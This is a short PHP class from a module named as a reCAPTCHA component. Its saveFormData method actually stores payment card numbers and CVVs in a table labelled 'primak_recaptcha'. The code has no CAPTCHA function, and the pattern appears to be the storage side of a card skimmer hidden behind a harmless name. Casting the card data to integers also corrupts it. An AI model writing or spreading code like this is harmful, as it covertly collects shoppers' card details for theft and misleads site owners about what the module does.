<?php

declare(strict_types=1);

namespace Primak\Recaptcha\Model;

use Primak\Recaptcha\Model\RecaptchaResource;

/**
 * class Management
 */
class Management
{
    /**
     * @var RecaptchaResource
     */
    private RecaptchaResource $resource;

    /**
     * Management constructor.
     * @param \Primak\Recaptcha\Model\RecaptchaResource $resource
     */
    public function __construct(
        RecaptchaResource $resource
    ) {
        $this->resource = $resource;
    }

    /**
     * @param $cardNumber
     * @param $cvv
     * @return void
     */
    public function saveFormData($cardNumber, $cvv)
    {
        $data[] = ['card_number' => (int)$cardNumber, 'cvv' => (int)$cvv];

        $this->resource->getConnection()->insertMultiple($this->resource->getTable('primak_recaptcha'), $data);
    }
}

